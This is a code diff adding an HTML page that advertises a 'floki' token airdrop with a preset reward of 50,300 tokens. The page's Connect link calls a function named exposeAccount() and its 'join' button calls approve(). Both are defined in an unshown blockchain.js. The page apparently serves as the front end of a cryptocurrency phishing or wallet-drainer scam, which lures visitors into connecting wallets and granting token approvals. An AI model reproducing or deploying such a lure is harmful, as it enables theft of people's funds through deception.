@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Web</title>
+    <link rel="stylesheet" href="style.css" />
+    <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
+    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+    <script src="blockchain.js"></script>
+  </head>
+  <body>
+    <header>
+      <div class="container">
+        <nav>
+          <div class="logo">
+            <a href="#">Title</a>
+          </div>
+          <div class="menu">
+            <ul>
+              <li>
+                <a href="#" onclick="exposeAccount(); return false;">Connect</a>
+              </li>
+            </ul>
+          </div>
+        </nav>
+      </div>
+    </header>
+    <main>
+      <div class="container">
+        <div class="row">
+          <div class="col">
+            <div class="text">floki</div>
+          </div>
+          <div class="col hidden">
+            <div class="text">floki</div>
+          </div>
+          <div class="col hidden">
+            <div class="text">floki</div>
+          </div>
+        </div>
+        <div class="row">
+          <div class="col">
+            <div onclick="approve(); return false;" class="button">join</div>
+          </div>
+          <div class="col hidden">
+            <div class="button">join</div>
+          </div>
+          <div class="col hidden">
+            <div class="button">join</div>
+          </div>
+        </div>
+        <div class="airdrop">your estimated airdrop token</div>
+        <div class="row">
+          <div class="col">
+            <div class="number">50,300</div>
+          </div>
+          <div class="col hidden">
+            <div class="number">100</div>
+          </div>
+          <div class="col hidden">
+            <div class="number">200</div>
+          </div>
+        </div>
+        <div class="airdrop">
+          <div class="airdrop-text">first airdrop</div>
+          <div class="airdrop-number">60%</div>
+        </div>
+        <div class="airdrop">
+          <div class="airdrop-text">second airdrop</div>
+          <div class="airdrop-number">30%</div>
+        </div>
+        <div class="airdrop">
+          <div class="airdrop-text">third airdrop</div>
+          gg
+          <div class="airdrop-number">10%</div>
+        </div>
+      </div>
+    </main>
+  </body>
+</html>
